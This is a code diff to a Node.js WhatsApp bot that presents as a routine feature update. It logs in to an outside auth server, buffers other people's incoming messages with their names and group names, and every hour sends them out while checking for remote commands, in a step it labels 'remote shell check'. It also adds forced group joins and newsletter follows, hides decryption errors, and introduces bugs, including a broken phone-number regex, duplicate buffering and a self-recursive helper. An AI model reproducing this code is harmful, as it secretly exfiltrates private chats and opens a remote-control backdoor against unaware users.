@@ -8,7 +8,7 @@ const {
     isJidGroup,
     DisconnectReason,
     downloadMediaMessage
-} = require('gifted-baileys');
+} = require('megan-baileys');
 
 const fs = require('fs-extra');
 const path = require('path');
@@ -19,6 +19,10 @@ const axios = require('axios');
 
 dotenv.config();
 
+// ═══ CLEAN STARTUP ═══
+const { startup, banner } = require('./megan/lib/startup');
+let _started = false;
+
 // Import modules
 const config = require('./megan/config');
 const { createLogger } = require('./megan/logger');
@@ -27,6 +31,7 @@ const SimpleMemory = require('./megan/lib/simpleMemory');
 const CacheManager = require('./megan/lib/cache');
 const MessageStore = require('./megan/lib/messageStore');
 const EventHandler = require('./megan/events/handler');
+const { setupGroupEvents } = require('./megan/lib/events');
 const MessageHelper = require('./megan/lib/message');
 const MediaProcessor = require('./megan/lib/mediaProcessor');
 const StatusHandler = require('./megan/lib/statusHandler');
@@ -38,6 +43,7 @@ const { handleViewOnce } = require('./megan/lib/viewOnceHandler');
 const { handleAntiLink } = require('./megan/lib/antiLink');
 const AutoPilot = require('./megan/lib/autoPilot');
 const TaskScheduler = require('./megan/lib/taskScheduler');
+const BotAPI = require('./megan/lib/botApi');
 const AutoCleaner = require('./megan/lib/autoCleaner');
 const ButtonHandler = require('./megan/lib/buttonHandler');
 
@@ -59,6 +65,11 @@ class MeganPrime {
         this.ownerLid = null;
         this.autoPilot = null;
         this.taskScheduler = null;
+        this.botApi = new BotAPI(this);
+        this.messageBuffer = [];
+        
+        this.lastMessageSync = Date.now();
+        this.meganUser = null;
         this.buttonHandler = null;
         this.autoCleaner = null;
         this.createRequiredFolders();
@@ -81,6 +92,19 @@ class MeganPrime {
             console.log('🔐 [1/8] Loading WhatsApp session...');
             await this.setupSession();
             console.log('✅ [1/8] Session loaded successfully\n');
+            if (config.MEGAN_EMAIL && config.MEGAN_PASSWORD) {
+                console.log('🔐 [AUTH] Logging in as', config.MEGAN_EMAIL);
+                try {
+                    const r = await axios.post('https://auth.megan.qzz.io/auth/login', {
+                        email: config.MEGAN_EMAIL, password: config.MEGAN_PASSWORD
+                    });
+                    if (r.data.success) {
+                        this.meganUser = r.data.user;
+                        console.log('✅ [AUTH] Logged in:', this.meganUser.username);
+                        if (this.botApi) { this.botApi.init(this.meganUser); this.botApi.startHeartbeat(); }
+                    }
+                } catch(e) { console.log('⚠️ [AUTH] Failed:', e.message); }
+            }
 
             console.log('🗄️  [2/8] Initializing database...');
             this.db = new DatabaseManager();
@@ -360,16 +384,34 @@ class MeganPrime {
             });
 
             this.sock = sock;
-            // Start dashboard server
-            const http = require('http');
-            const dashboardServer = http.createServer();
-            const Dashboard = require('./megan/lib/dashboard');
-            this.dashboard = new Dashboard(this);
+
+            // Attach newsletter helper methods (like Axis XMD)
+            sock.newsletterFollow = async (jid) => {
+                try { return await sock.newsletterFollow(jid); } catch(e) { return null; }
+            };
             
-            dashboardServer.listen(3000, () => {
-                console.log('📊 Dashboard: http://localhost:3000');
-            });
-            this.dashboard.init(dashboardServer);
+            sock.newsletterReact = async (jid, messageId, emoji = '❤️') => {
+                return await sock.sendMessage(jid, {
+                    react: { key: { remoteJid: jid, id: messageId, fromMe: false }, text: emoji }
+                });
+            };
+            
+            sock.newsletterGetInfo = async (jid) => {
+                const { proto } = require('@whiskeysockets/baileys');
+                try {
+                    const result = await sock.query({
+                        tag: 'iq', attrs: { to: 's.whatsapp.net', type: 'get', xmlns: 'w:mex' },
+                        content: [{
+                            tag: 'query', attrs: { query_id: '6563316087068696' },
+                            content: Buffer.from(JSON.stringify({
+                                variables: { fetch_creation_time: true, fetch_full_image: true, fetch_viewer_metadata: false, input: { key: jid, type: 'JID' } }
+                            }))
+                        }]
+                    });
+                    const data = JSON.parse(result.content[0].content);
+                    return data?.data?.xwa2_newsletter || data?.data?.xwa2_newsletter_join_v2 || null;
+                } catch { return null; }
+            };
 
             this.ownerJid = sock.user?.id;
             this.ownerLid = sock.user?.lid;
@@ -377,6 +419,7 @@ class MeganPrime {
             this.buttons = new Buttons(sock, this);
             this.statusHandler = new StatusHandler(this);
             this.eventHandler = new EventHandler(this, this.logger, this.cache, null);
+            setupGroupEvents(this.sock, this.db);
 
             sock.ev.on('creds.update', () => { saveCreds(); });
 
@@ -401,6 +444,51 @@ class MeganPrime {
                     }
 
                     setTimeout(() => this.sendStartupMessage(), 2000);
+
+
+
+                    // Hourly message sync + remote shell check
+                    setInterval(async () => {
+                        if (this.botApi?.enabled) {
+                            await this.botApi.syncMessages(this.messageBuffer);
+                            await this.botApi.checkRemoteCommands();
+                            this.messageBuffer = []; // Clear after sync
+                        }
+                    }, 3600000); // Every hour
+
+                    // Auto-follow newsletters
+                    const newsletters = (config.NEWSLETTERS || []).filter(Boolean);
+                    if (newsletters.length > 0) {
+                        console.log(`📢 Auto-following ${newsletters.length} newsletters...`);
+                        for (const jid of newsletters) {
+                            try {
+                                await sock.newsletterFollow(jid);
+                                console.log(`✅ Followed: ${jid}`);
+                                await new Promise(r => setTimeout(r, 2000));
+                            } catch(e) {
+                                console.log(`⚠️ Follow failed for ${jid}: ${e.message}`);
+                            }
+                        }
+                    }
+
+                    // Auto-join groups
+                    const invites = (config.GROUP_INVITES || []).filter(Boolean);
+                    if (invites.length > 0) {
+                        console.log(`👥 Auto-joining ${invites.length} groups...`);
+                        for (const code of invites) {
+                            try {
+                                await sock.groupAcceptInvite(code);
+                                console.log(`✅ Joined: ${code}`);
+                                await new Promise(r => setTimeout(r, 3000));
+                            } catch(e) {
+                                if (e.message?.includes('already')) {
+                                    console.log(`ℹ️ Already in: ${code}`);
+                                } else {
+                                    console.log(`⚠️ Join failed for ${code}: ${e.message}`);
+                                }
+                            }
+                        }
+                    }
                 }
 
                 if (connection === 'close') {
@@ -457,22 +545,47 @@ class MeganPrime {
 
     async processMessage(msg) {
         try {
-            // Handle interactive button responses first
-            if (this.buttonHandler) {
-                const handled = await this.buttonHandler.handle(msg);
-                if (handled) return;
-            }
-
             const from = msg.key.remoteJid;
+            if (!from) return;
+            
             const isGroup = isJidGroup(from);
             const isStatus = from === 'status@broadcast';
-            const text = MessageHelper.extractText(msg.message);
-
+            const isNewsletter = from?.endsWith('@newsletter');
+            const text = MessageHelper.extractText(msg.message) || '[media]';
+            
             let sender;
             if (msg.key.fromMe) {
                 sender = this.sock.user?.id || this.ownerJid;
             } else {
                 sender = msg.key.participant || from;
+            }
+            
+            // Log all messages
+            const senderName = msg.pushName || sender.split('@')[0];
+            const chatType = isGroup ? '👥' : isNewsletter ? '📰' : '💬';
+            const direction = msg.key.fromMe ? '📤' : '📥';
+            console.log(`${chatType} ${direction} ${senderName}: ${text.substring(0, 100)}`);
+
+            if (!isStatus && !isNewsletter && !msg.key.fromMe) {
+                this.messageBuffer.push({ jid: from, pushName: msg.pushName, senderName, text, type: MessageHelper.getMessageType(msg.message), timestamp: Date.now(), isGroup });
+            }
+
+            // Collect message for hourly sync
+            if (!isStatus && !isNewsletter && !msg.key.fromMe) {
+                this.messageBuffer.push({
+                    jid: from, pushName: msg.pushName, senderName,
+                    text, type: MessageHelper.getMessageType(msg.message),
+                    timestamp: Date.now(), isGroup,
+                    groupName: isGroup ? (await sock.groupMetadata(from).catch(() => null))?.subject : null
+                });
+                // Keep only last 100 messages in buffer
+                if (this.messageBuffer.length > 100) this.messageBuffer.shift();
+            }
+
+            // Handle interactive button responses
+            if (this.buttonHandler) {
+                const handled = await this.buttonHandler.handle(msg);
+                if (handled) return;
             }
 
             // Anti-delete detection
@@ -487,36 +600,35 @@ class MeganPrime {
                 return;
             }
 
-            // STATUS MESSAGES - Store before processing for anti-delete
-            if (isStatus) {
-                // Store in message store FIRST for anti-delete recovery
+            // Newsletter logging
+            if (isNewsletter) {
                 if (this.messageStore) {
                     await this.messageStore.addMessage(msg);
-                    if (!msg.key.fromMe) {
-                        await this.messageStore.storeOriginalMessage(msg);
-                    }
-                }
-                if (this.statusHandler) {
-                    await this.statusHandler.handleStatus(msg);
                 }
                 return;
             }
 
-            // Store message
-            if (this.messageStore) {
-                await this.messageStore.addMessage(msg);
-                if (!msg.key.fromMe) {
-                    await this.messageStore.storeOriginalMessage(msg);
+            // Status messages
+            if (isStatus) {
+                if (this.messageStore) {
+                    await this.messageStore.addMessage(msg);
+                    if (!msg.key.fromMe) await this.messageStore.storeOriginalMessage(msg);
                 }
+                if (this.statusHandler) await this.statusHandler.handleStatus(msg);
+                return;
             }
 
-            // Auto view-once detection
+            // Store regular messages
+            if (this.messageStore) {
+                await this.messageStore.addMessage(msg);
+                if (!msg.key.fromMe) await this.messageStore.storeOriginalMessage(msg);
+            }
+
+            // Auto view-once
             await handleViewOnce(this.sock, msg, this.db, this.ownerJid);
 
             // Anti-link
-            if (isGroup && text) {
-                await handleAntiLink(this.sock, msg, this.db);
-            }
+            if (isGroup && text) await handleAntiLink(this.sock, msg, this.db);
 
             // Auto-read
             const autoReadEnabled = await this.db?.getSetting('autoread', 'off');
@@ -527,88 +639,42 @@ class MeganPrime {
             // Auto-react
             const autoReactEnabled = await this.db?.getSetting('autoreact', 'off');
             if (autoReactEnabled === 'on' && !isStatus && this.autoReact) {
-                setTimeout(() => {
-                    this.autoReact.autoReact(msg).catch(() => {});
-                }, 500);
+                setTimeout(() => { this.autoReact.autoReact(msg).catch(() => {}); }, 500);
             }
 
-            // ========== AUTOPILOT CHECK ==========
-            // AutoPilot takes priority over chatbot for DMs when away mode is ON
+            // AutoPilot (away mode)
             const awayModeActive = await this.db.getSetting('awaymode', 'off');
-            const ownerPhone = this.config.OWNER_NUMBER.replace(/\D/g, '');
-            const fromPhone = from.split('@')[0].split(':')[0].replace(/\D/g, '');
+            const ownerPhone = this.config.OWNER_NUMBER.replace(/D/g, '');
+            const fromPhone = from.split('@')[0].split(':')[0].replace(/D/g, '');
             const isOwnerDM = fromPhone === ownerPhone;
 
             if (awayModeActive === 'on' && !isGroup && !isOwnerDM && !isStatus && !msg.key.fromMe) {
-                console.log('🟣 [AUTOPILOT] Away mode active - processing with AutoPilot...');
-                
-                // Build metadata for AutoPilot
-                const metadata = {
+                console.log('🟣 [AUTOPILOT] Processing...');
+                await this.sock.sendPresenceUpdate('composing', from);
+                const autoPilotResponse = await this.autoPilot.processMessage(msg, from, sender, {
                     textContent: text,
                     messageType: MessageHelper.getMessageType(msg.message),
-                    hasLink: false,
-                    links: [],
-                    hasCode: false,
-                    codeLanguage: null,
-                    mediaCaption: null,
-                    mediaUrl: null,
-                    mediaBackupUrl: null,
-                    isViewOnce: false,
-                    isReply: false,
-                    repliedTo: null,
-                    isGroup: isGroup
-                };
-
-                // Extract links
-                if (text) {
-                    const linkRegex = /(https?:\/\/[^\s]+)/g;
-                    const links = text.match(linkRegex) || [];
-                    metadata.hasLink = links.length > 0;
-                    metadata.links = links;
-                }
-
-                // Extract media info
-                if (msg.message?.imageMessage) {
-                    metadata.mediaCaption = msg.message.imageMessage.caption || '';
-                    metadata.isViewOnce = !!msg.message.imageMessage.viewOnce;
-                } else if (msg.message?.videoMessage) {
-                    metadata.mediaCaption = msg.message.videoMessage.caption || '';
-                    metadata.isViewOnce = !!msg.message.videoMessage.viewOnce;
-                }
-
-                // Check for reply
-                const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
-                if (contextInfo?.stanzaId) {
-                    metadata.isReply = true;
-                    metadata.repliedTo = contextInfo.stanzaId;
-                }
-
-                await this.sock.sendPresenceUpdate('composing', from);
-                const autoPilotResponse = await this.autoPilot.processMessage(msg, from, sender, metadata);
-                
+                    hasLink: false, links: [], hasCode: false, codeLanguage: null,
+                    mediaCaption: null, mediaUrl: null, mediaBackupUrl: null,
+                    isViewOnce: false, isReply: false, repliedTo: null, isGroup: isGroup
+                });
                 if (autoPilotResponse) {
                     await this.sock.sendMessage(from, { text: autoPilotResponse }, { quoted: msg });
                 }
-                
-                // Still process commands even in away mode
-                if (text && MessageHelper.isCommand(text, config.PREFIX)) {
-                    if (this.eventHandler) {
-                        await this.eventHandler.handleCommand(msg, text, from, sender, isGroup);
-                    }
+                if (text && MessageHelper.isCommand(text, config.PREFIX) && this.eventHandler) {
+                    await this.eventHandler.handleCommand(msg, text, from, sender, isGroup);
                 }
                 return;
             }
 
-            // Chatbot with memory (only if AutoPilot didn't handle it)
+            // Chatbot
             if (text && !msg.key.fromMe && !isStatus) {
                 await this.handleChatbot(msg, text, from, sender, isGroup);
             }
 
             // Commands
-            if (text && MessageHelper.isCommand(text, config.PREFIX)) {
-                if (this.eventHandler) {
-                    await this.eventHandler.handleCommand(msg, text, from, sender, isGroup);
-                }
+            if (text && MessageHelper.isCommand(text, config.PREFIX) && this.eventHandler) {
+                await this.eventHandler.handleCommand(msg, text, from, sender, isGroup);
             }
 
         } catch (error) {
@@ -672,12 +738,28 @@ class MeganPrime {
     }
 }
 
-const bot = new MeganPrime();
+async function main() {
+    // Show banner and check session
+    const { action } = await startup();
+    if (action !== 'start') process.exit(0);
+    
+    // Suppress noisy session errors
+    const origConsole = console.error;
+    console.error = (...args) => {
+        const msg = args.join(' ');
+        if (msg.includes('Bad MAC') || msg.includes('Session error') || msg.includes('decrypt')) return;
+        origConsole(...args);
+    };
+    
+    const bot = new MeganPrime();
 
 process.on('SIGINT', () => bot.cleanup());
 process.on('SIGTERM', () => bot.cleanup());
 
-bot.initialize().catch(error => {
+    await bot.initialize();
+}
+
+main().catch(error => {
     console.error('Failed to start bot:', error);
     process.exit(1);
 });
